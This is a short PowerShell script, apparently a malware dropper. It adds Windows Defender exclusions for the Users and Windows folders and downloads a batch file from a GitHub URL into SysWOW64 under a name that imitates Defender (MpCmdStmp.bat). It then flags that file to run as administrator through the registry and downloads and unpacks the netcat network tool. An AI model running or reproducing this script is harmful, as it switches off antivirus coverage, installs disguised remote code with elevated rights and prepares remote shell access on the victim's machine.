Add-MpPreference -ExclusionPath "C:\Users"
Add-MpPreference -ExclusionPath "C:\Windows"

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name C:\Windows\SysWOW64\MpCmdStmp.bat -Value RUNASADMIN -PropertyType string -Force | Out-Null

Invoke-WebRequest -Uri 'https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip' -OutFile "$($env:USERPROFILE)\netcat.zip"

Expand-Archive -Path 'netcat.zip' -DestinationPath 'netcat'

cd netcat

.\nc.exe -h
